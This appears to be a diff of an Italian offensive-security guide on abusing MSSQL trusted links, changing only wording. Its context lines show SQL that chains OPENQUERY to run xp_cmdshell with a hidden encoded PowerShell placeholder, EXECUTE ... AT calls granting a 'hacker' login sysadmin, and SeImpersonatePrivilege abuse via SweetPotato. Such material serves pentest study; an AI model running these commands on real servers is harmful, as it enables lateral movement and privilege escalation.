@@ -220,7 +220,7 @@ EXEC sp_linkedservers;
 
 #### Eseguire query in un link affidabile
 
-Eseguire query tramite il link (esempio: trova più link nella nuova istanza accessibile):
+Eseguire query tramite il link (esempio: trovare più link nella nuova istanza accessibile):
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
@@ -230,7 +230,7 @@ Controlla dove vengono utilizzate le virgolette doppie e singole, è importante 
 
 ![](<../../.gitbook/assets/image (643).png>)
 
-Puoi continuare questa catena di link fidati per sempre manualmente.
+Puoi continuare questa catena di link fidati all'infinito manualmente.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -240,7 +240,7 @@ SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", '
 ```
 Se non puoi eseguire azioni come `exec xp_cmdshell` da `openquery()`, prova con il metodo `EXECUTE`.
 
-### Manual - EXECUTE
+### Manuale - EXECUTE
 
 Puoi anche abusare dei collegamenti fidati utilizzando `EXECUTE`:
 ```bash
@@ -252,7 +252,7 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 L'**utente locale MSSQL** di solito ha un tipo speciale di privilegio chiamato **`SeImpersonatePrivilege`**. Questo consente all'account di "impersonare un client dopo l'autenticazione".
 
-Una strategia che molti autori hanno ideato è forzare un servizio di SISTEMA ad autenticarsi a un servizio rogue o man-in-the-middle che l'attaccante crea. Questo servizio rogue è quindi in grado di impersonare il servizio di SISTEMA mentre sta cercando di autenticarsi.
+Una strategia che molti autori hanno ideato è forzare un servizio SYSTEM ad autenticarsi a un servizio rogue o man-in-the-middle che l'attaccante crea. Questo servizio rogue è quindi in grado di impersonare il servizio SYSTEM mentre sta cercando di autenticarsi.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) ha una raccolta di queste varie tecniche che possono essere eseguite tramite il comando `execute-assembly` di Beacon.
 
